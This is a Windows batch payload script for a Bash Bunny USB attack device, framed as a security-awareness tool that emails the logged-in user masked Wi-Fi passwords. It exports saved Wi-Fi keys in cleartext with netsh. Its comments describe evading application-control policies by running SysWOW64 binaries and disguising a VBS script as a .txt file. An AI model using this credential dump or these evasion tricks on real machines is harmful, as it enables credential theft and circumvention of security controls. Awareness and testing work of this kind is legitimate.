rem @Echo off
Goto :Start

---------------------------------------------------------------------------------------------------------

Script      : TeregoMail.cmd
Version     : 20230925
Author      : Teregoal

Description : This is a Hak5 Bashbunny payload script. It will use Outlook to send an awareness email to the
              loggedin user. To demonstrate the risk of an unlocked computer it scans the computer for wifi
              passwords and sends a the masked passwords in the email.  

              This script ...

              ... is free to use
              ... is to use at your own risk and resposibility
              ... is build for security awareness reasons
              ... is not meant to use for malicious activities
              ... is unsupported
              ... is tested on Windows 10 only
              ... is supposed to be in the folder \payloads\library\TeregoMail\scripts of your Bashbunny
              ... uses the vbs script \payloads\library\TeregoMail\scripts\SendOutlookMail.txt
              ... uses cscript.exe and netsh.exe 

---------------------------------------------------------------------------------------------------------

:Start
REM *** Set start time for logging
set scriptstart=%date% %time%

REM *** Set Language. Will impact the template to be used : MailTemplate_[language].html
Set lang=NL

REM *** Dir Settings, do not change
Set dirRoot=%~dp0
Set dirRoot=%dirRoot:\scripts\=%
Set dirLoot=%dirRoot%\loot
Set dirLog=%dirRoot%\log

REM *** Create Loot and Log Dir if not exist
if NOT exist %dirLoot% MD %dirLoot%
if NOT exist %dirLog% MD %dirLog%

@Echo off
REM *** Write to log
echo %scriptstart% TeregoMail.cmd started on computer %computername% for user %username% >> "%dirLog%\TeregoMail.log"

REM *** Run vbs script to send mail to user
REM *** Note : Some systems have policies to prevent executing cscript or netsh. This can be a restriction on the file path, or the hash
REM ***        This is why I use the versions in the SysWOW64 directory (32bit version). The hash is different from the
REM ***        one in system32 but works like a charm.
REM ***        On a 32bit version of Windows, there will be no SysWOW64 directory. I use system32 version instead.
REM ***        Also, there might be a block on .vbs files. That is why I store the vbs as a .txt file

REM *** Write WLAN Config to Loot dir
if Exist     "%windir%\SysWOW64\netsh.exe" "%windir%\SysWOW64\netsh.exe" wlan export profile key=clear folder="%dirLoot%"
if NOT Exist "%windir%\SysWOW64\netsh.exe" "%windir%\System32\netsh.exe" wlan export profile key=clear folder="%dirLoot%"

REM *** Run script to send email
if     Exist "%windir%\SysWOW64\cscript.exe" "%windir%\SysWOW64\cscript.exe" "%dirRoot%\scripts\SendOutlookMail.txt" "%lang%" "%dirLoot%" //b //e:vbs 
if NOT Exist "%windir%\SysWOW64\cscript.exe" "%windir%\System32\cscript.exe" "%dirRoot%\scripts\SendOutlookMail.txt" "%lang%" "%dirLoot%" //b //e:vbs 

REM *** Clean up Loot folder
rd "%dirLoot%" /q /s

REM *** Write to log
echo %date% %time% TeregoMail.cmd finished on computer %computername% for user %username% >> "%dirLog%\TeregoMail.log"


